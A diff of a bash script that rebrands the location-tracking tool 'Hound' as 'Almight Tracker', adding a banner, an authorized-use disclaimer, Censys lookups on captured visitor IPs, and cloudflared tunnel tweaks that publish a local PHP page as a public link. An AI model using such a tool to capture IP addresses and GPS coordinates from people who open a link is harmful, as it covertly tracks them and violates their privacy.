@@ -1,21 +1,24 @@
 #!/bin/bash
-# Hound v 0.2
-# Powered by TechChip
-# visit https://youtube.com/techchipnet
+# Almight Tracker v 0.3
+# Enhanced by Almight
+# Original: Hound by TechChip
 
 trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
-printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
-printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
-printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
-printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
+printf '\n   █████  ██      ███    ███ ██  ██████  ██   ██ ████████ \n'
+printf '  ██   ██ ██      ████  ████ ██ ██       ██   ██    ██    \n'
+printf '  ███████ ██      ██ ████ ██ ██ ██   ███ ███████    ██    \n'
+printf '  ██   ██ ██      ██  ██  ██ ██ ██    ██ ██   ██    ██    \n'
+printf '  ██   ██ ███████ ██      ██ ██  ██████  ██   ██    ██    \n\n'
 printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
-printf " \e[1;93m      Hound Ver 0.2 - by Anil Parashar [TechChip]\e[0m \n"
-printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m \n"
-printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
+printf " \e[1;93m         Almight Tracker v0.3 - Enhanced Edition\e[0m \n"
+printf " \e[1;92m      IP Tracking + GPS Location + Censys Integration \e[0m \n"
+printf "\e[1;90m Advanced tool for information gathering with automatic Censys lookup.\e[0m \n"
+printf "\n"
+printf "\e[1;33m ⚠️  DISCLAIMER: For AUTHORIZED testing ONLY. Use responsibly!\e[0m\n"
+printf "\e[1;36m ⭐ Like this tool? Star it: https://github.com/Josiasange37\e[0m\n"
 printf "\n"
 }
 
@@ -25,6 +28,13 @@ command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not instal
 }
 
 stop() {
+# Run Censys lookup before stopping
+if [[ -f "censys_lookup.sh" && -f "captured_ips.txt" ]]; then
+    printf "\n\e[1;93m[*] Generating Censys search links...\e[0m\n"
+    bash censys_lookup.sh
+    printf "\e[1;92m[*] Session data saved to targetreport.txt and saved.ip.txt\e[0m\n\n"
+fi
+
 checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
@@ -92,9 +102,9 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-rm cf.log > /dev/null 2>&1 &
+rm -f cf.log > /dev/null 2>&1
 ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
-sleep 10
+sleep 15
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
